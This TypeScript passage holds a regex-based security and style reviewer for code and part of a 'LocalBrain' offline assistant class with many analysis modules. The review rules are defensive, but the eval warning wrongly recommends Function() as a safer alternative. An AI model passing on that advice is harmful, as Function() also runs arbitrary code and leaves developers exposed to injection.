    // SQL injection risk — detect string concatenation within query-building contexts
    if (/(?:execute|query|prepare|exec)\s*\(.*\+/.test(code) || /(?:SELECT|INSERT|UPDATE|DELETE|DROP)\b[^;]*\$\{/i.test(code) || /(?:SELECT|INSERT|UPDATE|DELETE|DROP)\b[^;]*['"]?\s*\+\s*\w/i.test(code)) {
      issues.push({ severity: 'error', message: 'Potential SQL injection — string concatenation in SQL query', suggestion: 'Use parameterized queries or prepared statements' })
    }

    // eval() usage
    if (/\beval\s*\(/.test(code)) {
      const lineNum = lines.findIndex(l => /\beval\s*\(/.test(l)) + 1
      issues.push({ severity: 'error', line: lineNum || undefined, message: 'eval() is a security risk — can execute arbitrary code', suggestion: 'Use safer alternatives like JSON.parse() or Function()' })
    }

    // Hardcoded secrets
    if (/(?:password|secret|api[_-]?key|token)\s*[:=]\s*['"][^'"]{3,}['"]/i.test(code)) {
      issues.push({ severity: 'error', message: 'Possible hardcoded secret/credential detected', suggestion: 'Use environment variables or a secrets manager' })
    }

    // innerHTML usage (XSS risk)
    if (/\.innerHTML\s*=/.test(code)) {
      const lineNum = lines.findIndex(l => /\.innerHTML\s*=/.test(l)) + 1
      issues.push({ severity: 'warning', line: lineNum || undefined, message: 'innerHTML assignment may be vulnerable to XSS', suggestion: 'Use textContent or sanitize HTML before assignment' })
    }

    // Command injection via exec/spawn with string concatenation
    if (/(?:exec|execSync|spawn|spawnSync)\s*\(.*\+/.test(code) || /(?:exec|execSync)\s*\([^)]*\$\{/.test(code)) {
      const lineNum = lines.findIndex(l => /(?:exec|execSync|spawn)\s*\(/.test(l)) + 1
      issues.push({ severity: 'error', line: lineNum || undefined, message: 'Potential command injection — user input in shell command', suggestion: 'Use execFile() with argument arrays instead of exec() with string concatenation' })
    }

    // Path traversal risk — user input in file operations without validation
    if (/(?:readFile|writeFile|createReadStream|createWriteStream|access|stat|unlink|rmdir|mkdir)\s*\(.*\+/.test(code) || /(?:readFile|writeFile|open)\s*\([^)]*\$\{/.test(code)) {
      const lineNum = lines.findIndex(l => /(?:readFile|writeFile|createReadStream)\s*\(/.test(l)) + 1
      issues.push({ severity: 'warning', line: lineNum || undefined, message: 'Potential path traversal — validate file paths before file operations', suggestion: 'Use path.resolve() + startsWith() check against base directory, or path.basename() to strip directory components' })
    }

    // Insecure randomness for security-critical operations
    if (/Math\.random\s*\(\)/.test(code) && /(?:token|secret|password|key|salt|nonce|csrf|session)/i.test(code)) {
      const lineNum = lines.findIndex(l => /Math\.random\s*\(\)/.test(l)) + 1
      issues.push({ severity: 'error', line: lineNum || undefined, message: 'Math.random() is not cryptographically secure', suggestion: 'Use crypto.randomBytes() or crypto.randomUUID() for security-critical values' })
    }

    // Prototype pollution risk
    if (/\[.*\]\s*=/.test(code) && /(?:__proto__|constructor|prototype)/.test(code)) {
      issues.push({ severity: 'error', message: 'Potential prototype pollution — sanitize object keys from user input', suggestion: 'Use Object.create(null) for dictionary objects, or validate keys against a whitelist' })
    }

    // Insecure deserialization
    if (/JSON\.parse\s*\(.*(?:req|request|body|params|query|input|data)/.test(code) && !/try\s*\{/.test(code)) {
      issues.push({ severity: 'warning', message: 'JSON.parse of user input without try/catch — may throw on malformed input', suggestion: 'Wrap JSON.parse in try/catch and validate the parsed schema with Zod/Joi' })
    }

    // Regex DoS (ReDoS) — nested quantifiers
    if (/new RegExp\s*\(.*\+/.test(code)) {
      issues.push({ severity: 'warning', message: 'Dynamic regex from user input may cause ReDoS', suggestion: 'Sanitize regex input or use re2 (safe regex library) for user-provided patterns' })
    }

    // dangerouslySetInnerHTML (React XSS)
    if (/dangerouslySetInnerHTML/.test(code)) {
      const lineNum = lines.findIndex(l => /dangerouslySetInnerHTML/.test(l)) + 1
      issues.push({ severity: 'warning', line: lineNum || undefined, message: 'dangerouslySetInnerHTML bypasses React XSS protection', suggestion: 'Use DOMPurify to sanitize HTML before passing to dangerouslySetInnerHTML' })
    }

    // Insecure cookie settings
    if (/(?:set-cookie|setCookie|cookie)\s*[=(]/.test(code) && !/(?:httpOnly|secure|sameSite)/i.test(code)) {
      issues.push({ severity: 'warning', message: 'Cookie may be missing security attributes', suggestion: 'Set httpOnly: true, secure: true, sameSite: "Strict" or "Lax" on cookies' })
    }

    // CORS wildcard with credentials
    if (/Access-Control-Allow-Origin.*\*/.test(code) && /credentials/i.test(code)) {
      issues.push({ severity: 'error', message: 'CORS wildcard (*) with credentials is insecure', suggestion: 'Whitelist specific allowed origins instead of using * when credentials are enabled' })
    }
  }

  // ── Performance ──
  if (checkAll || focus.includes('performance')) {
    // Nested loops — track brace depth to estimate loop nesting
    let loopNestLevel = 0, maxLoopNest = 0, braceDepth = 0
    const loopBraceStarts: number[] = []
    for (const line of lines) {
      const trimmed = line.trim()
      const isLoop = /\b(for|while)\b/.test(trimmed)
      const opens = (trimmed.match(/\{/g) ?? []).length
      const closes = (trimmed.match(/\}/g) ?? []).length

      if (isLoop) {
        loopNestLevel++
        // Track that this brace level started a loop
        if (opens > 0) loopBraceStarts.push(braceDepth + opens)
      }

      braceDepth += opens - closes

      // Check if we closed a loop's brace
      while (loopBraceStarts.length > 0 && braceDepth < loopBraceStarts[loopBraceStarts.length - 1]!) {
        loopBraceStarts.pop()
        loopNestLevel = Math.max(0, loopNestLevel - 1)
      }

      maxLoopNest = Math.max(maxLoopNest, loopNestLevel)
    }
    if (maxLoopNest >= 3) {
      issues.push({ severity: 'warning', message: `Deeply nested loops detected (${maxLoopNest} levels) — possible O(n³) or worse complexity`, suggestion: 'Consider using hash maps or reducing loop nesting' })
    }

    // Large function
    if (lines.length > 100) {
      issues.push({ severity: 'info', message: `Function is ${lines.length} lines long — consider breaking into smaller functions`, suggestion: 'Extract logical sections into separate functions' })
    }
  }

  // ── Style ──
  if (checkAll || focus.includes('style')) {
    // Very long lines
    for (let i = 0; i < lines.length; i++) {
      if ((lines[i]?.length ?? 0) > 120) {
        issues.push({ severity: 'info', line: i + 1, message: `Line exceeds 120 characters (${lines[i]!.length} chars)`, suggestion: 'Break long lines for better readability' })
        break // Only report once
      }
    }

    // Missing return type (TypeScript)
    if (language === 'typescript') {
      for (let i = 0; i < lines.length; i++) {
        const line = lines[i]!
        const beforeBrace = line.split('{')[0] ?? ''
        // Check for function declarations that have a closing paren but no type annotation after it
        if (/(?:function\s+\w+|=>)\s*\{/.test(line) && /\)\s*\{/.test(line) && !/\)\s*:\s*\S/.test(beforeBrace)) {
          issues.push({ severity: 'info', line: i + 1, message: 'Function missing explicit return type', suggestion: 'Add return type annotation for better type safety' })
          break
        }
      }
    }

    // TODO comments
    for (let i = 0; i < lines.length; i++) {
      if (/\bTODO\b/i.test(lines[i]!)) {
        issues.push({ severity: 'info', line: i + 1, message: 'TODO comment found — unfinished work', suggestion: 'Complete or track this TODO item' })
      }
    }
  }

  // Calculate score
  const errorCount = issues.filter(i => i.severity === 'error').length
  const warningCount = issues.filter(i => i.severity === 'warning').length
  const infoCount = issues.filter(i => i.severity === 'info').length
  const score = Math.max(0, Math.min(100, 100 - errorCount * 15 - warningCount * 8 - infoCount * 2))

  const summary = issues.length === 0
    ? 'Code looks clean! No significant issues found.'
    : `Found ${issues.length} issue(s): ${errorCount} errors, ${warningCount} warnings, ${infoCount} info. Score: ${score}/100`

  return { issues, score, summary }
}

// ╔═══════════════════════════════════════════════════════════════════════════════╗
// ║  §9  LOCAL BRAIN — The main class (drop-in replacement for AiBrain)         ║
// ╚═══════════════════════════════════════════════════════════════════════════════╝

/**
 * 🧠 LocalBrain — A standalone AI brain that works WITHOUT any external API.
 *
 * This is a drop-in replacement for AiBrain. It provides:
 *  - **Chat**: Pattern-matching + knowledge-base powered responses
 *  - **Self-Learning**: Learns from conversations and corrections
 *  - **Code Generation**: Template + pattern based for 24 languages
 *  - **Code Review**: Deep static analysis via CodeMaster (CodeAnalyzer + CodeReviewer)
 *  - **Code Fixing**: Auto-fix detected issues via CodeFixer with diff generation
 *  - **Code Analysis**: Full complexity, anti-pattern, dependency, and smell detection
 *  - **Problem Decomposition**: Break complex tasks into ordered steps
 *  - **Image Analysis**: Metadata extraction from base64 image data
 *  - **Knowledge Search**: Search through built-in + learned knowledge
 *  - **Persistence**: Save and restore entire brain state
 *
 * No API key needed. No internet required. Fully self-contained.
 */
export class LocalBrain {
  private config: LocalBrainConfig
  private conversationHistory: ApiMessage[] = []
  private knowledgeBase: KnowledgeEntry[]
  private learnedPatterns: LearnedPattern[] = []
  private stats: LocalBrainStats
  private tfidfScorer: TfIdfScorer
  private learningsSinceLastSave = 0

  // ── Agent Intelligence ──
  private conversationContext: ConversationContext = {
    currentFile: null, currentFunction: null, currentProject: null,
    currentLanguage: null, topicStack: [], facts: [],
  }
  private userPreferences: UserPreferences = {
    indentation: 'spaces-2', quotes: 'single', semicolons: false,
    naming: 'camelCase', preferredLibraries: {}, lastUpdated: new Date().toISOString(),
  }

  // ── CodeMaster sub-modules (offline intelligence) ──
  private codeAnalyzer: CodeAnalyzer
  private codeReviewer: CodeReviewer
  private codeFixer: CodeFixer
  private problemDecomposer: ProblemDecomposer
  private codeLearningEngine: LearningEngine
  private performanceAnalyzer: PerformanceAnalyzer
  private typeFlowAnalyzer: TypeFlowAnalyzer
  private dependencyGraphAnalyzer: DependencyGraphAnalyzer
  private asyncFlowAnalyzer: AsyncFlowAnalyzer
  private testCoverageAnalyzer: TestCoverageAnalyzer
  private architecturalAnalyzer: ArchitecturalAnalyzer

  // ── Intelligence modules (cognitive layer) ──
  private semanticEngine: SemanticEngine | null = null
  private intentEngine: IntentEngine | null = null
  private contextManager: ContextManager | null = null
  private reasoningEngine: ReasoningEngine | null = null
  private metaCognition: MetaCognition | null = null

  // ── Advanced intelligence modules (semantic training layer) ──
  private semanticMemory: SemanticMemory | null = null
  private semanticTrainer: SemanticTrainer | null = null
  private analogicalReasoner: AnalogicalReasoner | null = null
  private topicModeler: TopicModeler | null = null

  // ── Cognitive intelligence modules (higher-order reasoning) ──
  private causalReasoner: CausalReasoner | null = null
  private abstractionEngine: AbstractionEngine | null = null
  private planningEngine: PlanningEngine | null = null
  private creativeEngine: CreativeEngine | null = null

  // ── Trading & financial intelligence modules (Phase 4) ──
  private tradingEngine: TradingEngine | null = null
  private marketAnalyzer: MarketAnalyzer | null = null
  private portfolioOptimizer: PortfolioOptimizer | null = null
  private strategyEngine: StrategyEngine | null = null
  private decisionEngine: DecisionEngine | null = null
  private knowledgeSynthesizer: KnowledgeSynthesizer | null = null
  private economicAnalyzer: EconomicAnalyzer | null = null
  private securityTrainer: SecurityTrainer | null = null

  // Semantic intelligence modules (Phase 5)
  private emotionEngine: EmotionEngine | null = null
  private temporalReasoner: TemporalReasoner | null = null
  private normalizationEngine: NormalizationEngine | null = null
  private bayesianNetwork: BayesianNetwork | null = null
  private ontologyManager: OntologyManager | null = null
  private dialogueManager: DialogueManager | null = null
  private argumentAnalyzer: ArgumentAnalyzer | null = null
  private narrativeEngine: NarrativeEngine | null = null

  // Cybersecurity intelligence modules (Phase 6)
  private vulnerabilityScanner: VulnerabilityScanner | null = null
  private threatModeler: ThreatModeler | null = null
  private exploitAnalyzer: ExploitAnalyzer | null = null
  private networkForensics: NetworkForensics | null = null

  // Understanding intelligence modules (Phase 7)
  private patternRecognizer: PatternRecognizer | null = null
  private conceptMapper: ConceptMapper | null = null
  private inferenceEngine: InferenceEngine | null = null
  private sentimentAnalyzer: SentimentAnalyzer | null = null

  // Deep intelligence modules (Phase 8)
  private deepUnderstanding: DeepUnderstandingEngine | null = null
  private taskOrchestrator: TaskOrchestrator | null = null
  private knowledgeReasoner: KnowledgeReasoner | null = null
  private adaptiveLearner: AdaptiveLearner | null = null

  // Intelligent coding & semantic modules (Phase 9)
  private semanticCodeAnalyzer: SemanticCodeAnalyzer | null = null
  private intelligentRefactorer: IntelligentRefactorer | null = null
  private codeIntentPredictor: CodeIntentPredictor | null = null
  private semanticBridge: SemanticBridge | null = null

  // Training excellence modules (Phase 10)
  private multiModalFusion: MultiModalFusion | null = null
  private curriculumOptimizer: CurriculumOptimizer | null = null

  // Deep analysis modules (Phase 11)
  private imageAnalyzer: ImageAnalyzer | null = null
  private documentAnalyzer: DocumentAnalyzer | null = null

  // Document-grounded Q&A (Phase 12 — PdfExpert)
  private pdfExpert: PdfExpert | null = null

  // Decision quality & memory consolidation
  private confidenceGate: ConfidenceGate | null = null
  private memoryConsolidator: MemoryConsolidator | null = null
  private chatTurnsSinceConsolidation = 0

  // Kurdish NLP modules
  private kurdishMorphology: KurdishMorphologicalAnalyzer | null = null
  private kurdishSentiment: KurdishSentimentAnalyzer | null = null
  private kurdishCorpus: KurdishTranslationCorpus | null = null

  // New intelligence modules
  private hypothesisEngine: HypothesisEngine | null = null
  private ethicalReasoner: EthicalReasoner | null = null
  private coreferenceResolver: CoreferenceResolver | null = null
  private languageDetector: LanguageDetector | null = null
  private dialogueActRecognizer: DialogueActRecognizer | null = null
  private queryDecomposer: QueryDecomposer | null = null
  private crossDomainTransfer: CrossDomainTransfer | null = null
  private counterfactualReasoner: CounterfactualReasoner | null = null
  private userProfileModel: UserProfileModel | null = null
  private conversationSummarizer: ConversationSummarizer | null = null
  private responseQualityScorer: ResponseQualityScorer | null = null
  private multiFormatGenerator: MultiFormatGenerator | null = null
  private anomalyDetector: AnomalyDetector | null = null
  private emotionalIntelligence: EmotionalIntelligence | null = null
  private contextualMemoryEngine: ContextualMemoryEngine | null = null
  private logicalProofEngine: LogicalProofEngine | null = null
  private creativeProblemSolver: CreativeProblemSolver | null = null
  private advancedSearchEngine: AdvancedSearchEngine | null = null

  // Meta-intelligence modules (Phase 13)
  private selfReflectionEngine: SelfReflectionEngine | null = null
  private toolReasoningEngine: ToolReasoningEngine | null = null
  private factVerificationEngine: FactVerificationEngine | null = null
  private explanationEngine: ExplanationEngine | null = null
  private feedbackLearnerEngine: FeedbackLearner | null = null

  // Advanced reasoning & autonomy modules (Phase 14)
  private workingMemoryEngine: WorkingMemoryEngine | null = null
  private goalManager: GoalManager | null = null
  private strategicPlanner: StrategicPlanner | null = null
  private selfModelEngine: SelfModelEngine | null = null
  private collaborationEngine: CollaborationEngine | null = null

  // Knowledge engineering & reasoning depth modules (Phase 15)
  private knowledgeGraphEngine: KnowledgeGraphEngine | null = null
  private debateEngine: DebateEngine | null = null
  private analyticalReasoner: AnalyticalReasoner | null = null
  private problemDecomposerEngine: ProblemDecomposerEngine | null = null
  private insightExtractor: InsightExtractor | null = null

  // Advanced intelligence & domain expertise modules (Phase 16)
  private naturalLanguageGenerator: NaturalLanguageGenerator | null = null
  private scientificReasoner: ScientificReasoner | null = null
  private dataPipelineEngine: DataPipelineEngine | null = null
  private personalityEngine: PersonalityEngine | null = null
  private codeOptimizer: CodeOptimizer | null = null

  // Smart coding agent
  private codeAgent: CodeAgent

  // Token budget management
  private tokenBudget: TokenBudgetManager

  // Auto-learning: track last confidence for feedback-based learning signals
  private lastConfidenceAssessment = 0.5
  private lastGateDecision: GateDecision = 'respond'

  constructor(config?: Partial<LocalBrainConfig>) {
    this.config = {
      model: config?.model ?? 'local-brain-v2',
      maxResponseLength: config?.maxResponseLength ?? 4096,
      creativity: config?.creativity ?? 0.3,
      systemPrompt: config?.systemPrompt ?? 'You are LocalBrain, a standalone AI assistant that works offline.',
      learningEnabled: config?.learningEnabled ?? true,
      maxLearnedPatterns: config?.maxLearnedPatterns ?? 1000,
      autoSavePath: config?.autoSavePath ?? '',
      autoSaveInterval: config?.autoSaveInterval ?? 5,
      decayRate: config?.decayRate ?? 0.01,
      minConfidence: config?.minConfidence ?? 0.1,
      useTfIdf: config?.useTfIdf ?? true,
      enableIntelligence: config?.enableIntelligence ?? true,
      maxSessionTokens: config?.maxSessionTokens ?? 80_000,
      budgetWarningThreshold: config?.budgetWarningThreshold ?? 0.85,
      enableBudgetTracking: config?.enableBudgetTracking ?? true,
      memoryConsolidationInterval: config?.memoryConsolidationInterval ?? 10,
      enableAutoLearning: config?.enableAutoLearning ?? true,
    }
    this.knowledgeBase = buildKnowledgeBase()
    this.tfidfScorer = new TfIdfScorer()

    // Initialize token budget manager
    this.tokenBudget = new TokenBudgetManager({
      maxSessionTokens: this.config.maxSessionTokens,
      warningThreshold: this.config.budgetWarningThreshold,
      enabled: this.config.enableBudgetTracking,
    })

    // Initialize CodeMaster sub-modules
    this.codeAnalyzer = new CodeAnalyzer()
    this.codeReviewer = new CodeReviewer()
    this.codeFixer = new CodeFixer()
    this.problemDecomposer = new ProblemDecomposer()
    this.codeLearningEngine = new LearningEngine()
    this.performanceAnalyzer = new PerformanceAnalyzer()
    this.typeFlowAnalyzer = new TypeFlowAnalyzer()
    this.dependencyGraphAnalyzer = new DependencyGraphAnalyzer()
    this.asyncFlowAnalyzer = new AsyncFlowAnalyzer()
    this.testCoverageAnalyzer = new TestCoverageAnalyzer()
    this.architecturalAnalyzer = new ArchitecturalAnalyzer()

    // Initialize intelligence modules if enabled
    if (this.config.enableIntelligence) {
      this.semanticEngine = new SemanticEngine()
      this.intentEngine = new IntentEngine()
      this.contextManager = new ContextManager()
      this.reasoningEngine = new ReasoningEngine()
      this.metaCognition = new MetaCognition()

      // Advanced intelligence modules (semantic training layer)
      this.semanticMemory = createProgrammingKnowledgeGraph()
      this.semanticTrainer = new SemanticTrainer()
      this.analogicalReasoner = new AnalogicalReasoner()
      this.topicModeler = new TopicModeler()

      // Cognitive intelligence modules (higher-order reasoning)
      this.causalReasoner = new CausalReasoner()
      this.abstractionEngine = createProgrammingAbstractionEngine()
      this.planningEngine = new PlanningEngine()
      this.creativeEngine = new CreativeEngine()

      // Trading & financial intelligence modules (Phase 4)
      this.tradingEngine = new TradingEngine()
      this.marketAnalyzer = new MarketAnalyzer()
      this.portfolioOptimizer = new PortfolioOptimizer()
      this.strategyEngine = new StrategyEngine()
      this.decisionEngine = new DecisionEngine()
      this.knowledgeSynthesizer = new KnowledgeSynthesizer()
      this.economicAnalyzer = new EconomicAnalyzer()
      this.securityTrainer = new SecurityTrainer()

      // Phase 5 — Semantic intelligence modules
      this.emotionEngine = new EmotionEngine()
      this.temporalReasoner = new TemporalReasoner()
      this.normalizationEngine = new NormalizationEngine()
      this.bayesianNetwork = new BayesianNetwork()
      this.ontologyManager = new OntologyManager()
      this.dialogueManager = new DialogueManager()
      this.argumentAnalyzer = new ArgumentAnalyzer()
      this.narrativeEngine = new NarrativeEngine()

      // Phase 6 — Cybersecurity intelligence modules
      this.vulnerabilityScanner = new VulnerabilityScanner()
      this.threatModeler = new ThreatModeler()
      this.exploitAnalyzer = new ExploitAnalyzer()
      this.networkForensics = new NetworkForensics()

      // Phase 7 — Understanding intelligence modules
      this.patternRecognizer = new PatternRecognizer()
      this.conceptMapper = new ConceptMapper()
      this.inferenceEngine = new InferenceEngine()
      this.sentimentAnalyzer = new SentimentAnalyzer()

      // Phase 8 — Deep intelligence modules
      this.deepUnderstanding = new DeepUnderstandingEngine()
      this.taskOrchestrator = new TaskOrchestrator()
      this.knowledgeReasoner = new KnowledgeReasoner()
      this.adaptiveLearner = new AdaptiveLearner()

      // Phase 9 — Intelligent coding & semantic modules
      this.semanticCodeAnalyzer = new SemanticCodeAnalyzer()
      this.intelligentRefactorer = new IntelligentRefactorer()
      this.codeIntentPredictor = new CodeIntentPredictor()
      this.semanticBridge = new SemanticBridge()

      // Phase 10 — Training excellence modules
      this.multiModalFusion = new MultiModalFusion()
      this.curriculumOptimizer = new CurriculumOptimizer()

      // Phase 11 — Deep analysis modules
      this.imageAnalyzer = new ImageAnalyzer()
      this.documentAnalyzer = new DocumentAnalyzer()

      // Phase 12 — Document-grounded Q&A
      this.pdfExpert = new PdfExpert()

      // Decision quality & memory consolidation
      this.confidenceGate = new ConfidenceGate()
      this.memoryConsolidator = new MemoryConsolidator()

      // Kurdish NLP modules
      this.kurdishMorphology = new KurdishMorphologicalAnalyzer()
      this.kurdishSentiment = new KurdishSentimentAnalyzer()
      this.kurdishCorpus = new KurdishTranslationCorpus()

      // New intelligence modules
      this.hypothesisEngine = new HypothesisEngine()
      this.ethicalReasoner = new EthicalReasoner()
      this.coreferenceResolver = new CoreferenceResolver()
      this.languageDetector = new LanguageDetector()
      this.dialogueActRecognizer = new DialogueActRecognizer()
      this.queryDecomposer = new QueryDecomposer()
      this.crossDomainTransfer = new CrossDomainTransfer()
      this.counterfactualReasoner = new CounterfactualReasoner()
      this.userProfileModel = new UserProfileModel()
      this.conversationSummarizer = new ConversationSummarizer()
      this.responseQualityScorer = new ResponseQualityScorer()
      this.multiFormatGenerator = new MultiFormatGenerator()
      this.anomalyDetector = new AnomalyDetector()
      this.emotionalIntelligence = new EmotionalIntelligence()
      this.contextualMemoryEngine = new ContextualMemoryEngine()
      this.logicalProofEngine = new LogicalProofEngine()
      this.creativeProblemSolver = new CreativeProblemSolver()

      // Advanced Search Engine: multi-strategy search with thinking
      this.advancedSearchEngine = new AdvancedSearchEngine()
      // Index the knowledge base for advanced search
      this.advancedSearchEngine.indexDocuments(
        this.knowledgeBase.map(entry => ({
          id: entry.id,
          title: entry.category,
          content: entry.content,
          keywords: entry.keywords,
          domain: entry.category,
          weight: entry.weight,
        }))
      )

      // Meta-intelligence modules (Phase 13)
      this.selfReflectionEngine = new SelfReflectionEngine()
      this.toolReasoningEngine = new ToolReasoningEngine()
      this.factVerificationEngine = new FactVerificationEngine()
      this.explanationEngine = new ExplanationEngine()
      this.feedbackLearnerEngine = new FeedbackLearner()

      // Advanced reasoning & autonomy modules (Phase 14)
      this.workingMemoryEngine = new WorkingMemoryEngine()
      this.goalManager = new GoalManager()
      this.strategicPlanner = new StrategicPlanner()
      this.selfModelEngine = new SelfModelEngine()
      this.collaborationEngine = new CollaborationEngine()

      // Knowledge engineering & reasoning depth modules (Phase 15)
      this.knowledgeGraphEngine = new KnowledgeGraphEngine()
      this.debateEngine = new DebateEngine()
      this.analyticalReasoner = new AnalyticalReasoner()
      this.problemDecomposerEngine = new ProblemDecomposerEngine()
      this.insightExtractor = new InsightExtractor()

      // Advanced intelligence & domain expertise modules (Phase 16)
      this.naturalLanguageGenerator = new NaturalLanguageGenerator()
      this.scientificReasoner = new ScientificReasoner()
      this.dataPipelineEngine = new DataPipelineEngine()
      this.personalityEngine = new PersonalityEngine()
      this.codeOptimizer = new CodeOptimizer()
    }

    // Initialize CodeAgent (always available — no external deps)
    this.codeAgent = new CodeAgent()

    const now = new Date().toISOString()
    this.stats = {
      totalChats: 0, totalCodeGenerations: 0, totalCodeReviews: 0,
      totalCodeAnalyses: 0, totalCodeFixes: 0, totalDecompositions: 0,
      totalImageAnalyses: 0, totalLearnings: 0, patternsLearned: 0,
      knowledgeEntriesAdded: 0, totalCodeCompletions: 0, totalCodeExplanations: 0,
      totalMultiStepReasons: 0, totalMultiFileGenerations: 0,
      createdAt: now, lastUsedAt: now,
    }

    // Auto-load persisted brain state if path configured and file exists
    if (this.config.autoSavePath) {
      this.autoLoad()
    }
  }

  // ── Chat (same interface as AiBrain.chat) ──

  /** Chat with the local brain. Returns a response with simulated token usage. */
  async chat(userMessage: string): Promise<{
    text: string
    usage: TokenUsage
    durationMs: number
    budgetWarning?: boolean
    budgetExhausted?: boolean
    remainingTokens?: number
    usagePercent?: number
    moduleFailures?: string[]
  }> {
    const start = Date.now()
    const moduleFailures: string[] = []

    // ── Input Validation ─────────────────────────────────────────────────────
    if (typeof userMessage !== 'string') {
      return {
        text: '⚠️ Invalid input: message must be a string.',
        usage: { inputTokens: 0, outputTokens: 10, cacheReadTokens: 0, cacheCreationTokens: 0 },
        durationMs: Date.now() - start,
      }
    }
    userMessage = userMessage.trim()
    if (userMessage.length === 0) {
      return {
        text: "It looks like you sent an empty message. How can I help you?",
        usage: { inputTokens: 0, outputTokens: 15, cacheReadTokens: 0, cacheCreationTokens: 0 },
        durationMs: Date.now() - start,
      }
    }
    if (userMessage.length > 100_000) {
      return {
        text: '⚠️ Message too long. Please keep messages under 100,000 characters.',
        usage: { inputTokens: Math.ceil(userMessage.length / 4), outputTokens: 15, cacheReadTokens: 0, cacheCreationTokens: 0 },
        durationMs: Date.now() - start,
      }
    }

    // ── Budget: handle continuation commands ─────────────────────────────────
    const lower = userMessage.trim().toLowerCase()
    if (lower === 'continue') {
      // If there are pending chunks from a truncated response, return next chunk
      if (this.tokenBudget.hasPendingChunks()) {
        const chunk = this.tokenBudget.getNextChunk()!
        const inputTokens = Math.ceil(userMessage.length / 4)
        const outputTokens = Math.ceil(chunk.length / 4)
        this.tokenBudget.trackUsage({ inputTokens, outputTokens })
        return {
          text: chunk,
          usage: { inputTokens, outputTokens, cacheReadTokens: 0, cacheCreationTokens: 0 },
          durationMs: Date.now() - start,
          ...this.getBudgetFields(),
        }
      }
      // Otherwise extend the token budget
      this.tokenBudget.extendBudget()
      const msg = '✅ Token budget extended. You can continue chatting.'
      return {
        text: msg,
        usage: { inputTokens: 2, outputTokens: Math.ceil(msg.length / 4), cacheReadTokens: 0, cacheCreationTokens: 0 },
        durationMs: Date.now() - start,
        ...this.getBudgetFields(),
      }
    }
    if (lower === 'reset') {
      this.tokenBudget.reset()
      const msg = '🔄 Session reset. Token budget cleared. Ready to start fresh!'
      return {
        text: msg,
        usage: { inputTokens: 1, outputTokens: Math.ceil(msg.length / 4), cacheReadTokens: 0, cacheCreationTokens: 0 },
        durationMs: Date.now() - start,
        ...this.getBudgetFields(),
      }
    }

    // ── Budget: check if exhausted before proceeding ─────────────────────────
    if (!this.tokenBudget.canContinue()) {
      const msg = '🛑 Token budget reached. Type \'continue\' to extend the budget or \'reset\' to start a new session.'
      return {
        text: msg,
        usage: { inputTokens: Math.ceil(userMessage.length / 4), outputTokens: Math.ceil(msg.length / 4), cacheReadTokens: 0, cacheCreationTokens: 0 },
        durationMs: Date.now() - start,
        ...this.getBudgetFields(),
      }
    }

    this.conversationHistory.push({ role: 'user', content: userMessage })

    // Apply confidence decay to unused patterns
    this.applyConfidenceDecay()

    // Detect intent and extract keywords
    const intent = detectIntent(userMessage)
    const keywords = extractKeywords(userMessage)

    // Phase 8: Deep Understanding — multi-intent parsing, entity extraction, ambiguity detection
    let understanding: ReturnType<DeepUnderstandingEngine['understand']> | null = null
    if (this.deepUnderstanding) {
      const contextTurns = this.conversationHistory.slice(-10).map((m, i) => ({
        role: m.role, content: m.content, timestamp: Date.now() - (10 - i) * 1000,
      }))
      understanding = this.deepUnderstanding.understand(userMessage, contextTurns)
      // Augment keywords with extracted entities from deep understanding
      for (const entity of understanding.entities) {
        const val = entity.value.toLowerCase()
        if (!keywords.includes(val)) {
          keywords.push(val)
        }
      }
    }

    // Phase 8: KnowledgeReasoner — feed extracted facts into knowledge graph
    if (this.knowledgeReasoner && this.adaptiveLearner) {
      const facts = this.adaptiveLearner.extractFacts(userMessage)
      for (const fact of facts) {
        if (fact.confidence >= 0.5 && !fact.negated) {
          this.knowledgeReasoner.addFact(fact.subject, fact.relation, fact.object, fact.confidence, 'conversation')
        }
      }
    }

    // Use IntentEngine for richer intent classification if available
    if (this.intentEngine) {
      const intentResult = this.intentEngine.classify(userMessage)
      // Augment keywords with extracted entities
      for (const entity of intentResult.entities) {
        if (!keywords.includes(entity.value.toLowerCase())) {
          keywords.push(entity.value.toLowerCase())
        }
      }
    }

    // Track context with ContextManager if available
    if (this.contextManager) {
      this.contextManager.addTurn({ role: 'user', content: userMessage, timestamp: Date.now() })
    }

    // Search knowledge base
    const knowledgeResults = searchKnowledge(this.knowledgeBase, keywords)

    // Use SemanticEngine for semantic search augmentation if available
    if (this.semanticEngine && knowledgeResults.length < 3) {
      const kbDocs = this.knowledgeBase.map(e => ({ id: e.id, text: e.content }))
      const semanticResults = this.semanticEngine.findSimilar(userMessage, kbDocs, 3)
      for (const sr of semanticResults) {
        if (!knowledgeResults.some(kr => kr.entry.id === sr.id)) {
          const entry = this.knowledgeBase.find(e => e.id === sr.id)
          if (entry) {
            knowledgeResults.push({ entry, score: sr.score * 5, matchedKeywords: keywords.slice(0, 3) })
          }
        }
      }
    }

    // Use SemanticMemory for graph-based knowledge retrieval if available
    if (this.semanticMemory) {
      // Find concepts matching the user's keywords via spreading activation
      const seedIds: string[] = []
      for (const kw of keywords.slice(0, 5)) {
        if (!kw || kw.trim() === '') continue
        const concept = this.semanticMemory.findConceptByName(kw)
        if (concept) seedIds.push(concept.id)
      }
      if (seedIds.length > 0) {
        // Spreading activation to find related concepts beyond keyword matching
        const _activated = this.semanticMemory.spreadingActivation(seedIds, 2, 5)
        // Extract relationships from the conversation to grow the graph
        const extracted = this.semanticMemory.extractRelationships(userMessage)
        for (const rel of extracted) {
          if (!rel.source?.trim() || !rel.target?.trim()) continue
          const src = this.semanticMemory.findConceptByName(rel.source)
            ?? (() => { const id = this.semanticMemory!.addConcept(rel.source, 'general'); return this.semanticMemory!.getConcept(id); })()
          const tgt = this.semanticMemory.findConceptByName(rel.target)
            ?? (() => { const id = this.semanticMemory!.addConcept(rel.target, 'general'); return this.semanticMemory!.getConcept(id); })()
          if (src && tgt) {
            this.semanticMemory.addRelation(src.id, tgt.id, rel.relation, rel.confidence)
          }
        }
      }
    }

    // ── Smart Module Augmentation ─────────────────────────────────────────────
    // Wire intelligence modules into the response pipeline based on intent
    let smartAugmentation = ''

    // ReasoningEngine: for complex multi-step queries AND math/physics/logic problems
    if (this.reasoningEngine && (this.isComplexQuery(userMessage) || this.isMathPhysicsLogicQuery(userMessage))) {
      try {
        const reasonResult = this.reasoningEngine.reason(userMessage)
        if (reasonResult.confidence > 0.3 && reasonResult.steps.length > 0) {
          const stepsText = reasonResult.steps.map((s, i) => `${i + 1}. ${s.content ?? s.conclusion ?? s.description ?? ''}`).join('\n')
          if (stepsText.trim()) {
            smartAugmentation += `\n\n**Reasoning:**\n${stepsText}`
          }
